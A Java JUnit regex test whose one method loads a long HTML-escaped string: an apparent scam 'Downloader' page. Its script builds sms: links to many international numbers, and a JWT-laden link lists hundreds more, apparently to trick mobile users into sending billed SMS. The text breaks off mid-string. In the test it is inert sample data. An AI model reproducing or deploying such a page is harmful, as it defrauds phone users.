package com.techsure.strange.regex;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.junit.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class RoundRegexTest {
	private static final Logger logger = LoggerFactory.getLogger(RoundRegexTest.class);

	@Test
	public void testRound(){
		StringBuffer sBuffer = new StringBuffer();

		sBuffer.append("&lt;!DOCTYPEhtml&gt;&lt;htmlxmlns='/1999/xhtml'&gt;&lt;head&gt;&lt;metahttp-equiv='Content-Type'content='text/html;charset=utf-8'/&gt;&lt;title&gt;Downloader&lt;/title&gt;&lt;metaname='description'content='Downloader'&gt;&lt;metaname='keywords'content='Downloader'&gt;&lt;metaname='viewport'content='width=device-width,initial-scale=1'/&gt;&lt;linkrel='icon'href='http://cdn.clean-download.com/groupds/1/assets/img/favicon.png'&gt;&lt;script&gt;vardev='android';varphoneNumbers='00447559552023;00447559516014;00447559552026;00447559516012;00447559552022;00447559516013;00447559552029;00447559516011;00447559552021;00447559552028;00447559552024;00447559552027;00447559552025;0077625310250';varaf='5001036558399550';varmessage='plaintiffwaiverdealingsubsequently5001036558399550believed';varurlTo='';if(dev=='iphone'){urlTo='sms://open?addresses='+phoneNumbers+'/&amp;body='+encodeURIComponent(message);}else{urlTo='sms:'+phoneNumbers+'?body='+encodeURIComponent(message);}varurlContent='https://megaplaylive.com/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5nIjoiZW4iLCJjb3VudHJ5IjoiSU4iLCJwaG9uZV9udW1iZXJzIjoiW1wiMDA0NDc1NTk1NTIwMjNcIixcIjAwNDQ3NTU5NTE2MDE0XCIsXCIwMDQ0NzU1OTU1MjAyNlwiLFwiMDA0NDc1NTk1MTYwMTJcIixcIjAwNDQ3NTU5NTUyMDIyXCIsXCIwMDQ0NzU1OTUxNjAxM1wiLFwiMDA0NDc1NTk1NTIwMjlcIixcIjAwNDQ3NTU5NTE2MDExXCIsXCIwMDQ0NzU1OTU1MjAyMVwiLFwiMDA0NDc1NTk1NTIwMjhcIixcIjAwNDQ3NTU5NTUyMDI0XCIsXCIwMDQ0NzU1OTU1MjAyN1wiLFwiMDA0NDc1NTk1NTIwMjVcIl0iLCJudW1iZXJzX2ludGVydmFsIjoiMTMiLCJjaGVja19udW1iZXJzIjoiW1wiMDAyMjQ3OTExMTE2NjBcIixcIjAwMjQzODA5NzAwMTkwXCIsXCIwMDMxNjg5OTU4MjIwXCIsXCIwMDM3MzkwMDM4MDYwXCIsXCIwMDQxNzQyNzkwMzUwXCIsXCIwMDQxNzk5NzcwNzYwXCIsXCIwMDQ4NzgwMjAzMjQwXCIsXCIwMDQ5MTU1NTUwMDk1ODBcIixcIjAwNjc0NTU5MDMxMFwiLFwiMDA2NzU3MDg5MDI2MFwiLFwiMDA2NzY4NDgwMTEwXCIsXCIwMDY3ODU1OTQzNDBcIixcIjAwMjY1MjEyMzQxMjMwXCIsXCIwMDMyNDYzMDIxNjQ0XCIsXCIwMDMyNDY4NzgwMzYwXCIsXCIwMDMyNDY3NDAxNTMwXCIsXCIwMDMyNzcwMDA5MDAwMDA2N1wiLFwiMDAzNTg0NTcxMjY1MFwiLFwiMDAzNzA2NjQwMDA5NVwiLFwiMDAzNzI1ODk5MTAyMFwiLFwiMDA3OTIzODI4MjExM1wiLFwiMDA3OTU4NTM4Nzg5MFwiLFwiMDAzNTI2NTUxMDAwMTJcIixcIjAwMjQzMTIzMTkxMVwiLFwiMDAyNDM0MzAwNjQxXCIsXCIwMDI0Mzc3MDA1MTFcIixcIjAwMjQzODYwMDc1MVwiLFwiMDA0NTkxMjA4MDE3XCIsXCIwMDY3NDU1NzgzMTVcIixcIjAwNjc0NTU5MDA2MFwiLFwiMDA2NzY4NDg3OTAwXCIsXCIwMDY3ODU1OTQwMjlcIixcIjAwODgxODQ2MDEwMFwiLFwiMDAxMjY0NTM4MDMwMVwiLFwiMDAyMzY3NzgwMDMxMFwiLFwiMDAyMzcyMjk0NTY2MVwiLFwiMDAzMTY4OTk1ODAxMVwiLFwiMDAzMjQ2MzA0MTY3MVwiLFwiMDAzMjQ2NzQwMDIzNVwiLFwiMDAzMjQ2ODc4MDQwMlwiLFwiMDAzMjQ2ODkyMTAwMlwiLFwiMDAzNTg0NTcxMjEyMlwiLFwiMDAzNzA2NjQ5MjA4NFwiLFwiMDAzNzA2NjU0MTExMFwiLFwiMDM3MDY2NjUxMDYwXCIsXCIwMDM3MDY2NzIzNDMwXCIsXCIwMDM3MjU4OTkxNDAwXCIsXCIwMDM3MzkwMDM4MDkxXCIsXCIwMDQxNzQyNzkyMTMwXCIsXCIwMDQxNzczMTEyMDMzXCIsXCIwMDQxNzk5NzcwNjAxXCIsXCIwMDQ4NzgwMjAzNzEwXCIsXCIwMDY3NTcwODkwMDE2XCIsXCIwMDc3NjI1MzEwMzI1XCIsXCIwMDc5MjM4MjgyMDIwXCIsXCIwMDc5NTg1Mzg3MDQwXCIsXCIwMDc5Njk3NTMwMTUwXCIsXCIwMDc5ODUyMTk0MDQwXCIsXCIwMDc5OTIwMzA2MDMwXCIsXCIwMDIxMTE3ODkyMDIxMFwiLFwiMDAyMTE5Nzg5MjAyMTBcIixcIjAwMjI0NzkwMDAwMDQxXCIsXCIwMDI0MjAxMTgwMDMwMVwiLFwiMDAyNDM4MDk3MDAwMTFcIixcIjAwMjQzODg3NDkwMzAxXCIsXCIwMDI1ODg1Mjg5NDMxMFwiLFwiMDAyNjQ4NTcxMjAzMDFcIixcIjAwMjY1MjEyMzQxMjQyXCIsXCIwMDM1MjY1NTEwMDE4MFwiLFwiMDA5MDUxMDI2MDEyMDBcIixcIjAwOTY3NzA1MjEwMzAxXCIsXCIwMDMyNzcwMDA5MDAwMDAwMVwiLFwiMDAxMjY0NTM4MDI1MFwiLFwiMDAyMzY3NzgwMDI1MFwiLFwiMDA3NzYyNTMxMDI1MFwiLFwiMDAyMTExNzg5MjAyNTBcIixcIjAwMjExOTc4OTIwMjQwXCIsXCIwMDI0MjAxMTgwMDI1MFwiLFwiMDAyNDM4ODc0OTAyNTBcIixcIjAwMjU4ODUyODk0MjUwXCIsXCIwMDI2NDg1NzEyMDI1MFwiLFwiMDA5Njc3MDUyMTAyNTBcIixcIjAwMTI2NDUzODAxMDFcIixcIjAwMjExMTc4OTIwMTAxXCIsXCIwMDIxMTk3ODkyMDEwMVwiLFwiMDAyMzQ3MDAwMDAwMTAwXCIsXCIwMDIzNjc3ODAwMTAxXCIsXCIwMDI0MjAxMTgwMDEwMVwiLFwiMDAyNDM4ODc0OTAxMDFcIixcIjAwMjU4ODMwMDAwMTAwXCIsXCIwMDI1ODg1Mjg5NDEwMVwiLFwiMDAyNjQ4NTcxMjAxMDFcIixcIjAwMjY1MjEyMzQxNDAwXCIsXCIwMDMyNDY3NDAwNDAwXCIsXCIwMDMyNDY3NDEwMDAwXCIsXCIwMDMyNDY4OTAxMzAwXCIsXCIwMDMyNDY4OTAyMzAwXCIsXCIwMDMyNDY4OTA1MTAwXCIsXCIwMDMyNzcwMDA5MDAwMDE4NlwiLFwiMDAzNzA2NjQwMDMxNlwiLFwiMDAzNzA2NjQ1MDc2MFwiLFwiMDAzNzA2NjQ5MjU2MFwiLFwiMDAzNzA2NjU0MTU2MVwiLFwiMDAzNzA2NjY1MTQ0MFwiLFwiMDAzNzA2NjY1MjMwMFwiLFwiMDAzNzA2NjY1ODYwMFwiLFwiMDAzNzA2NjcyMzE4MFwiLFwiMDAzNzI1ODk5MTEzM1wiLFwiMDA0MTc0Mjc5MDEwOVwiLFwiMDA0MTc5OTc3MDI4NFwiLFwiMDA0ODc4MDIwMzYzNVwiLFwiMDA2NzQ1NTkwMTU5XCIsXCIwMDY3NTcwODkwMjc2XCIsXCIwMDY3Njg0ODAxMDVcIixcIjAwNjc4NTU5NDIxMlwiLFwiMDA3NzYyNTMxMDEwNFwiLFwiMDA3OTIzODI4MjIzOFwiLFwiMDA3OTU4NTM4NzE4MFwiLFwiMDA3OTY5NzUzMDE3MVwiLFwiMDA3OTg1MjE5MzIxMVwiLFwiMDA3OTkyMDMwNjIxNlwiLFwiMDA4ODE4NDYwMTEwXCIsXCIwMDkwNTEwMjY2MTAwM1wiLFwiMDA5Njc3MDUyMTAxMDFcIixcIjAwOTY3NzA1MjEwMjgwXCIsXCIwMDIxMTE3ODkyMDI4MFwiLFwiMDAyMTE5Nzg5MjAyODBcIixcIjAwNzc2MjUzMTAyODBcIixcIjAwMjQzODg3NDkwNTAwXCIsXCIwMDEyNjQ1MzgwNjAwXCIsXCIwMDI2NDg1NzEyMDI4MFwiLFwiMDAyMzQ3MDAwMDAwMzAwXCIsXCIwMDIzNjc3ODAwMjgwXCIsXCIwMDI1ODg1Mjg5NDI4MFwiLFwiMDAyNTg4MzAwMDAyMTBcIixcIjAwMjQyMDExODAwMjgwXCIsXCIwMDM0NzAwMzAwMDUwXCIsXCIwMDM0NzAwMzAwMjkwXCIsXCIwMDIzNDcwMDMzMDAxMzBcIixcIjAwMjExMTYwMDAwMDEwXCIsXCIwMDI0Mzg4NTAwMDA0MFwiLFwiMDAxMjY0NTM5MDEwMFwiLFwiMDAxMjY0NTQwMDEwMFwiLFwiMDAzNDcwMDMwMDAyMVwiLFwiMDA2NzU3MDg5NjEwNVwiLFwiMDA2Nzk1MTk4NzcwXCIsXCIwMDMyNDY3NDAxNDMwXCIsXCIwMDMyNDY4OTAwOTQwXCIsXCIwMDY3NDU1OTcwNTVcIixcIjAwNjc0NTU5OTEyMFwiLFwiMDA2NzQ1NTk2NjcwXCIsXCIwMDY3Njg0ODIzNzBcIixcIjAwNjc4NTk5ODMwOVwiLFwiMDA2ODU3MjE1Njc0XCIsXCIwMDQ4NzgwMjA3MDMwXCIsXCIwMDc3NjI1MzEwNzAwXCIsXCIwMDkwNTEwMjY2MTA1NFwiLFwiMDAyNTg4NTI4OTQ3MDBcIixcIjAwMjU4ODMwMDAwNjAwXCIsXCIwMDIzNjc3MDAwNjgwXCIsXCIwMDI0Mzg4NTAwMDM4MFwiLFwiMDAyMzQ3MDAwMDAwNjgwXCIsXCIwMDMyNDY4OTAxMzMyXCIsXCIwMDMyNDY3NDAyMDgxXCIsXCIwMDI0MzgwOTcwMDQxNVwiLFwiMDAzNzI1ODk5MDUzMFwiLFwiMDA3OTU4NTM4ODU3N1wiLFwiMDA0MTc5OTc3MDU2MFwiLFwiMDAzNDcwMDMwMDMzMFwiLFwiMDA2NzY4NDgwMjQwXCIsXCIwMDY3ODU1OTQyMzBcIixcIjAwNDU5MTIwODcyOVwiLFwiMDAzNTg0NTcxMjgxMFwiLFwiMDA0OTE1NTU1MTg4MDE1XCIsXCIwMDI2NTIxMjM0MTU2MFwiLFwiMDAzNzM5MDA0MDA4NFwiLFwiMDA2NzQ1NTkyNzIwXCIsXCIwMDMxNjg5OTU4MjY4XCIsXCIwMDY3NTcwODkwMzUwXCIsXCIwMDMyNDYzMDI2MjE1XCIsXCIwMDY3ODU1OTU0MzBcIixcIjAwNDkxNTU1NTE4ODAzNVwiLFwiMDA2NDkzMDkzNjk2MDMzXCIsXCIwMDY0ODIyMjU1NTAyOVwiLFwiMDA2NDc5Njg4Mjc4NjgxXCIsXCIwMDQ2NzI1MzA4MzAxXCIsXCIwMDQ2NzIyNDgzOTYwXCIsXCIwMDQ2NzAyNDc1OTMxXCIsXCIwMDQ2NzAyNDU0NDMwXCIsXCIwMDQ2NzAyNDUxNjI3XCIsXCIwMDk2NDc4MzIzMDA1NDJcIixcIjAwOTY0NzgzMjIxOTUzOFwiLFwiMDA5NjQ3ODMyMTcwMjU0XCIsXCIwMDk2NDc4MzIwNDcyNzhcIixcIjAwOTY0NzgzMTE5NTI5OFwiLFwiMDA5NjQ3NzQwNTAzNTk4XCIsXCIwMDk2NDc3Mzk1NDcxNTFcIixcIjAwOTY0NzczNjMxMzg0MFwiLFwiMDA5NjA5OTk4MzE0XCIsXCIwMDk2MDk5OTMxNTdcIixcIjAwOTYwOTk0NjIwNFwiLFwiMDA5NjA5OTMwMTczXCIsXCIwMDk2MDk4MjQ1NzNcIixcIjAwOTYwOTgxODgyN1wiLFwiMDA5NjQ3NTA0ODAwMDUzXCIsXCIwMDk2NDc1MDQ4NzM1NDRcIixcIjAwOTY0NzUwMzY4MjM1N1wiLFwiMDA5NjQ3NTAyMDc4NzA1XCIsXCIwMDY3OTUxOTQ1MTBcIixcIjAwMzcyNTg5OTIyMjBcIixcIjAwNDg3ODAyMDMxMjJcIixcIjAwMzcwNjY0MDAyODFcIixcIjAwNDQ3NDUyMzE4NzAxXCIsXCIwMDQ0NzUzNzYwOTkxMVwiLFwiMDAzMjc3MDAwOTAwMDA2NTFcIixcIjAwMzI0Njg5MDExMTBcIixcIjAwMzI0Njg5MDAzMDVcIixcIjAwMjM2Nzc4MDA5MDBcIixcIjAwMjQzODA5NzAwMTY1XCIsXCIwMDIyNDc5MTExMjUxMlwiLFwiMDAyNjUyMTIzNDEwMDBcIixcIjAwMjQzMTMzMjAyMVwiLFwiMDA3NzYyNTMxMTMwMFwiLFwiMDAyNDM3NzAwMjMxXCIsXCIwMDM3MzkwMDQwMDAwXCIsXCIwMDQ0NzAwMDAwMDAwMFwiLFwiMDA0NDc0MTg0OTU0MDdcIixcIjAwNDQ3NDUyMjIxNjA3XCIsXCIwMDQ0NzYyNDEyNjMyOFwiLFwiMDA0NDc0MTg0MjAwMjBcIixcIjAwNDQ3NDQxMDAxMzA4XCIsXCIwMDQ0NzkyNDgwMDkyN1wiLFwiMDA0NDc5MjQxNDAzMDdcIixcIjAwNDQ3NDUyMDAzNTEwXCIsXCIwMDQ0NzkyNDA4NzkwN1wiLFwiMDA0NDc1NTk1NTIwMjBcIixcIjAwNDQ3NjY5MzcwMDI5XCIsXCIwMDM3MjU4OTkwMjg4XCIsXCIwMDM3MDY5NzQ2MDcxXCIsXCIwMDc5OTIwMzA4MTAzXCIsXCIwMDM3MDY2NDUwNjAwXCIsXCIwMDM3MDY2NDkyMTMxXCIsXCIwMDM3MDY2NTQxMTMxXCIsXCIwMDM3MDY2NjUxMDExXCIsXCIwMDc5NTg1Mzg4MzQwXCIsXCIwMDc5NTg1Mzg5NDU1XCIsXCIwMDc5Njk3NTMwNjc2XCIsXCIwMDc5Njk3NTMxMzkxXCIsXCIwMDQ0NzQ1MjIyMTYyNVwiLFwiMDA0NDc2NDAxMTE0OTBcIixcIjAwNDQ3NTU5NTAxMzMwXCIsXCIwMDQ0NzQwNjU2MDE0MFwiLFwiMDA0NDc2NjkzOTIwMjBcIixcIjAwNDQ3NDA2NTkzMDAwXCIsXCIwMDQ0NzY0MDE1MjEwMFwiLFwiMDAwXCIsXCIwMDI2Mzc4NzExMjEzMFwiXSIsImRldiI6ImFuZHJvaWQiLCJwZXJjZW50IjowLCJhZiI6IjUwMDEwMzY1NTgzOTk1NTAiLCJpc3MiOiJjbGljazJzbXMiLCJleHAiOjE1NTk3MTE0NjQsImlhdCI6MTU1OTcwNzg2NCwiaXNwIjoiYWN0IGZpYmVybmV0IiwiY29udGVudF90eXBlIjoiZ2FtZXMiLCJhdmFpbGFibGUiOjEwMTYsImlkc19zZXJ2ZWQiOjEwMTZ9.0YuHHX2vTPHnh7HEQaYNCmvoH-oC0y3YHm4p5rVmlI4';&lt;/script&gt;&lt;style&gt;/*ResetCSS*---------------------------------------*/body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,textarea,p,blockquote,th,td{padding:0;margin:0;}@keyframesblink{0%{opacity:1;}50%{opacity:0.5;}100%{opacity:1;}}@keyframesvitrate{0%{transform:scale(1);}50%{transform:scale(0.95);}100%{transform:scale(1);}}@keyframesappear{0%{opacity:0;}100%{opacity:1;}}@keyframesdisappear{0%{opacity:1;}100%{opacity:0;}}a{text-decoration:none;color:#606060;}body{background-color:#e3e3e3;text-align:center;font-family:sans-serif;}.header{background-color:#151412;display:flex;align-items:center;padding:10px;}.name{color:#fff;font-family:sans-serif;font-size:24px;margin-left:10px;}.step1{width:100%;height:400px;animation:disappear1sease-out3sforwards;text-align:center;position:absolute;}.step2{opacity:0;position:absolute;width:100%;height:400px;animation:appear1sease-out3sforwards;text-align:center;margin-top:20px;}.lds-center{position:absolute;top:50%;left:50%;margin-top:-55px;margin-left:-55px;}.lds-ring{display:inline-block;position:relative;width:200px;height:200px;margin:20pxauto20pxauto;background-color:#fff;border-radius:50%;}.lds-ringdiv{box-sizing:border-box;display:block;position:absolute;width:100%;height:100%;margin:0px;border:24pxsolid#fff;border-radius:50%;animation:lds-ring1.2scubic-bezier(0.5,0,0.5,1)infinite;border-color:#008D36transparenttransparenttransparent;}.lds-ringdiv:nth-child(1){animation-delay:-0.45s;}.lds-ringdiv:nth-child(2){animation-delay:-0.3s;}.lds-ringdiv:nth-child(3){animation-delay:-0.15s;}@keyframeslds-ring{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.title{color:#3c3c3b;font-family:sans-serif;font-size:32px;}.subtitle{color:#706F6F;font-family:sans-serif;font-size:22px;}.button{width:80%;margin:67vhauto20pxauto;min-height:1px;padding:20px;border-radius:5px;font-stretch:normal;font-size:20px;line-height:normal;background-color:#008D36;text-align:center;color:#fff;font-family:sans-serif;animation:vitrate1sinfinite4s;cursor:pointer;}.footer{text-decoration:none;font-family:sans-serif;font-size:12px;color:#606060;text-align:center;}.modal{position:absolute;top:0;width:100vw;height:100vh;background-color:rgba(0,0,0,0.8);z-index:100;text-align:center;display:none;}.content{width:80%;margin:15vhauto0auto;background-color:white;border-radius:5px;border:3pxsolid#008D36;font-family:sans-serif;}.modalp{font-size:16px;margin-bottom:20px;margin-top:19px;padding:010px;}.modalbutton{background-color:#008D36;text-align:center;color:#fff;font-family:sans-serif;border-radius:5px;cursor:pointer;font-stretch:normal;font-size:18px;line-height:normal;padding:10px25px;width:75%;margin-bottom:20px;text-transform:uppercase;}.modal-header{padding:3px07px5px;text-align:left;background-color:#008D36;color:#fff;font-family:sans-serif;display:flex;align-items:center;}.modal-headerimg{width:30px;}.modal-headerh5{margin-top:5px;font-size:15px;text-transform:uppercase;}#terms_title{text-align:left;font-size:20px;font-family:sans-serif;font-weight:normal;margin:20px0;border-bottom:2pxsolid#008D36;}.terms_p{}.container-terms{text-align:justify;padding:05vw;margin-bottom:50px;}#cont-content-loader{text-align:center;padding-top:50px;}#cont-content-loaderp{font-size:20px;}/*****************************************************************************************/.lds-default{display:inline-block;position:relative;width:64px;height:64px;}.lds-defaultdiv{position:absolute;width:5px;height:5px;background:#008D36;border-radius:50%;animation:lds-default1.2slinearinfinite;}.lds-defaultdiv:nth-child(1){animation-delay:0s;top:29px;left:53px;}.lds-defaultdiv:nth-child(2){animation-delay:-0.1s;top:18px;left:50px;}.lds-defaultdiv:nth-child(3){animation-delay:-0.2s;top:9px;left:41px;}.lds-defaultdiv:nth-child(4){animation-delay:-0.3s;top:6px;left:29px;}.lds-defaultdiv:nth-child(5){animation-delay:-0.4s;top:9px;left:18px;}.lds-defaultdiv:nth-child(6){animation-delay:-0.5s;top:18px;left:9px;}.lds-defaultdiv:nth-child(7){animation-delay:-0.6s;top:29px;left:6px;}.lds-defaultdiv:nth-child(8){animation-delay:-0.7s;top:41px;left:9px;}.lds-defaultdiv:nth-child(9){animation-delay:-0.8s;top:50px;left:18px;}.lds-defaultdiv:nth-child(10){animation-delay:-0.9s;top:53px;left:29px;}.lds-defaultdiv:nth-child(11){animation-delay:-1s;top:50px;left:41px;}.lds-defaultdiv:nth-child(12){animation-delay:-1.1s;top:41px;left:50px;}@keyframeslds-default{0%,20%,80%,100%{transform:scale(1);}50%{transform:scale(1.5);}}#cont-content-loader{display:none;}#content-title{text-align:center;font-size:22px;font-family:font_rg;margin:35pxauto15pxauto;}#cont_content_link{text-align:center;display:none;}#content-button{background-color:#008D36;border:none;border-radius:5px;color:#fff;padding:10px25px;margin-top:20px;font-size:16px;cursor:pointer;}@media(orientation:portrait)and(min-width:375px){.modal-headerh5{font-size:18px;margin-left:5px;}}@media(orientation:portrait)and(min-height:568px){.button{margin-top:60vh;}.footer{position:absolute;bottom:20px;left:0;width:100%;}.content{margin-top:10vh;}}@media(orientation:portrait)and(min-height:667px){.step1{margin-top:50px;}.step2{margin-top:70px;}}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;divclass='header'&gt;&lt;imgclass='icon'src='http://cdn.clean-download.com/groupds/1/assets/img/icon.png'&gt;&lt;pclass='name'&gt;Downloader&lt;/p&gt;&lt;/div&gt;&lt;divclass='step1'id='step1'&gt;&lt;divclass='lds-ring'&gt;&lt;imgclass='lds-center'src='http://cdn.clean-download.com/groupds/1/assets/img/center.png'&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;divclass='txt1'&gt;&lt;pclass='title'&gt;Loading&lt;/p&gt;&lt;pclass='subtitle'&gt;Pleasewait&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;divclass='step2'id='step2'&gt;&lt;imgclass='file'src='http://cdn.clean-download.com/groupds/1/assets/img/file.png'&gt;&lt;divclass='txt2'&gt;&lt;pclass='title'&gt;FileReady&lt;/p&gt;&lt;pclass='subtitle'&gt;4.45MB&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;divid='cont_content_link'&gt;&lt;h1id='content-title'&gt;ContentUnlocked&lt;/h1&gt;&lt;p&gt;Yourcontenthasbeenunlockedsuccessfullyclickonthelinkbelowandenjoyit.&lt;/p&gt;&lt;ahref='https://megaplaylive.com/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5nIjoiZW4iLCJjb3VudHJ5IjoiSU4iLCJwaG9uZV9udW1iZXJzIjoiW1wiMDA0NDc1NTk1NTIwMjNcIixcIjAwNDQ3NTU5NTE2MDE0XCIsXCIwMDQ0NzU1OTU1MjAyNlwiLFwiMDA0NDc1NTk1MTYwMTJcIixcIjAwNDQ3NTU5NTUyMDIyXCIsXCIwMDQ0NzU1OTUxNjAxM1wiLFwiMDA0NDc1NTk1NTIwMjlcIixcIjAwNDQ3NTU5NTE2MDExXCIsXCIwMDQ0NzU1OTU1MjAyMVwiLFwiMDA0NDc1NTk1NTIwMjhcIixcIjAwNDQ3NTU5NTUyMDI0XCIsXCIwMDQ0NzU1OTU1MjAyN1wiLFwiMDA0NDc1NTk1NTIwMjVcIl0iLCJudW1iZXJzX2ludGVydmFsIjoiMTMiLCJjaGVja19udW1iZXJzIjoiW1wiMDAyMjQ3OTExMTE2NjBcIixcIjAwMjQzODA5NzAwMTkwXCIsXCIwMDMxNjg5OTU4MjIwXCIsXCIwMDM3MzkwMDM4MDYwXCIsXCIwMDQxNzQyNzkwMzUwXCIsXCIwMDQxNzk5NzcwNzYwXCIsXCIwMDQ4NzgwMjAzMjQwXCIsXCIwMDQ5MTU1NTUwMDk1ODBcIixcIjAwNjc0NTU5MDMxMFwiLFwiMDA2NzU3MDg5MDI2MFwiLFwiMDA2NzY4NDgwMTEwXCIsXCIwMDY3ODU1OTQzNDBcIixcIjAwMjY1MjEyMzQxMjMwXCIsXCIwMDMyNDYzMDIxNjQ0XCIsXCIwMDMyNDY4NzgwMzYwXCIsXCIwMDMyNDY3NDAxNTMwXCIsXCIwMDMyNzcwMDA5MDAwMDA2N1wiLFwiMDAzNTg0NTcxMjY1MFwiLFwiMDAzNzA2NjQwMDA5NVwiLFwiMDAzNzI1ODk5MTAyMFwiLFwiMDA3OTIzODI4MjExM1wiLFwiMDA3OTU4NTM4Nzg5MFwiLFwiMDAzNTI2NTUxMDAwMTJcIixcIjAwMjQzMTIzMTkxMVwiLFwiMDAyNDM0MzAwNjQxXCIsXCIwMDI0Mzc3MDA1MTFcIixcIjAwMjQzODYwMDc1MVwiLFwiMDA0NTkxMjA4MDE3XCIsXCIwMDY3NDU1NzgzMTVcIixcIjAwNjc0NTU5MDA2MFwiLFwiMDA2NzY4NDg3OTAwXCIsXCIwMDY3ODU1OTQwMjlcIixcIjAwODgxODQ2MDEwMFwiLFwiMDAxMjY0NTM4MDMwMVwiLFwiMDAyMzY3NzgwMDMxMFwiLFwiMDAyMzcyMjk0NTY2MVwiLFwiMDAzMTY4OTk1ODAxMVwiLFwiMDAzMjQ2MzA0MTY3MVwiLFwiMDAzMjQ2NzQwMDIzNVwiLFwiMDAzMjQ2ODc4MDQwMlwiLFwiMDAzMjQ2ODkyMTAwMlwiLFwiMDAzNTg0NTcxMjEyMlwiLFwiMDAzNzA2NjQ5MjA4NFwiLFwiMDAzNzA2NjU0MTExMFwiLFwiMDM3MDY2NjUxMDYwXCIsXCIwMDM3MDY2NzIzNDMwXCIsXCIwMDM3MjU4OTkxNDAwXCIsXCIwMDM3MzkwMDM4MDkxXCIsXCIwMDQxNzQyNzkyMTMwXCIsXCIwMDQxNzczMTEyMDMzXCIsXCIwMDQxNzk5NzcwNjAxXCIsXCIwMDQ4NzgwMjAzNzEwXCIsXCIwMDY3NTcwODkwMDE2XCIsXCIwMDc3NjI1MzEwMzI1XCIsXCIwMDc5MjM4MjgyMDIwXCIsXCIwMDc5NTg1Mzg3MDQwXCIsXCIwMDc5Njk3NTMwMTUwXCIsXCIwMDc5ODUyMTk0MDQwXCIsXCIwMDc5OTIwMzA2MDMwXCIsXCIwMDIxMTE3ODkyMDIxMFwiLFwiMDAyMTE5Nzg5MjAyMTBcIixcIjAwMjI0NzkwMDAwMDQxXCIsXCIwMDI0MjAxMTgwMDMwMVwiLFwiMDAyNDM4MDk3MDAwMTFcIixcIjAwMjQzODg3NDkwMzAxXCIsXCIwMDI1ODg1Mjg5NDMxMFwiLFwiMDAyNjQ4NTcxMjAzMDFcIixcIjAwMjY1MjEyMzQxMjQyXCIsXCIwMDM1MjY1NTEwMDE4MFwiLFwiMDA5MDUxMDI2MDEyMDBcIixcIjAwOTY3NzA1MjEwMzAxXCIsXCIwMDMyNzcwMDA5MDAwMDAwMVwiLFwiMDAxMjY0NTM4MDI1MFwiLFwiMDAyMzY3NzgwMDI1MFwiLFwiMDA3NzYyNTMxMDI1MFwiLFwiMDAyMTExNzg5MjAyNTBcIixcIjAwMjExOTc4OTIwMjQwXCIsXCIwMDI0MjAxMTgwMDI1MFwiLFwiMDAyNDM4ODc0OTAyNTBcIixcIjAwMjU4ODUyODk0MjUwXCIsXCIwMDI2NDg1NzEyMDI1MFwiLFwiMDA5Njc3MDUyMTAyNTBcIixcIjAwMTI2NDUzODAxMDFcIixcIjAwMjExMTc4OTIwMTAxXCIsXCIwMDIxMTk3ODkyMDEwMVwiLFwiMDAyMzQ3MDAwMDAwMTAwXCIsXCIwMDIzNjc3ODAwMTAxXCIsXCIwMDI0MjAxMTgwMDEwMVwiLFwiMDAyNDM4ODc0OTAxMDFcIixcIjAwMjU4ODMwMDAwMTAwXCIsXCIwMDI1ODg1Mjg5NDEwMVwiLFwiMDAyNjQ4NTcxMjAxMDFcIixcIjAwMjY1MjEyMzQxNDAwXCIsXCIwMDMyNDY3NDAwNDAwXCIsXCIwMDMyNDY3NDEwMDAwXCIsXCIwMDMyNDY4OTAxMzAwXCIsXCIwMDMyNDY4OTAyMzAwXCIsXCIwMDMyNDY4OTA1MTAwXCIsXCIwMDMyNzcwMDA5MDAwMDE4NlwiLFwiMDAzNzA2NjQwMDMxNlwiLFwiMDAzNzA2NjQ1MDc2MFwiLFwiMDAzNzA2NjQ5MjU2MFwiLFwiMDAzNzA2NjU0MTU2MVwiLFwiMDAzNzA2NjY1MTQ0MFwiLFwiMDAzNzA2NjY1MjMwMFwiLFwiMDAzNzA2NjY1ODYwMFwiLFwiMDAzNzA2NjcyMzE4MFwiLFwiMDAzNzI1ODk5MTEzM1wiLFwiMDA0MTc0Mjc5MDEwOVwiLFwiMDA0MTc5OTc3MDI4NFwiLFwiMDA0ODc4MDIwMzYzNVwiLFwiMDA2NzQ1NTkwMTU5XCIsXCIwMDY3NTcwODkwMjc2XCIsXCIwMDY3Njg0ODAxMDVcIixcIjAwNjc4NTU5NDIxMlwiLFwiMDA3NzYyNTMxMDEwNFwiLFwiMDA3OTIzODI4MjIzOFwiLFwiMDA3OTU4NTM4NzE4MFwiLFwiMDA3OTY5NzUzMDE3MVwiLFwiMDA3OTg1MjE5MzIxMVwiLFwiMDA3OTkyMDMwNjIxNlwiLFwiMDA4ODE4NDYwMTEwXCIsXCIwMDkwNTEwMjY2MTAwM1wiLFwiMDA5Njc3MDUyMTAxMDFcIixcIjAwOTY3NzA1MjEwMjgwXCIsXCIwMDIxMTE3ODkyMDI4MFwiLFwiMDAyMTE5Nzg5MjAyODBcIixcIjAwNzc2MjUzMTAyODBcIixcIjAwMjQzODg3NDkwNTAwXCIsXCIwMDEyNjQ1MzgwNjAwXCIsXCIwMDI2NDg1NzEyMDI4MFwiLFwiMDAyMzQ3MDAwMDAwMzAwXCIsXCIwMDIzNjc3ODAwMjgwXCIsXCIwMDI1ODg1Mjg5NDI4MFwiLFwiMDAyNTg4MzAwMDAyMTBcIixcIjAwMjQyMDExODAwMjgwXCIsXCIwMDM0NzAwMzAwMDUwXCIsXCIwMDM0NzAwMzAwMjkwXCIsXCIwMDIzNDcwMDMzMDAxMzBcIixcIjAwMjExMTYwMDAwMDEwXCIsXCIwMDI0Mzg4NTAwMDA0MFwiLFwiMDAxMjY0NTM5MDEwMFwiLFwiMDAxMjY0NTQwMDEwMFwiLFwiMDAzNDcwMDMwMDAyMVwiLFwiMDA2NzU3MDg5NjEwNVwiLFwiMDA2Nzk1MTk4NzcwXCIsXCIwMDMyNDY3NDAxNDMwXCIsX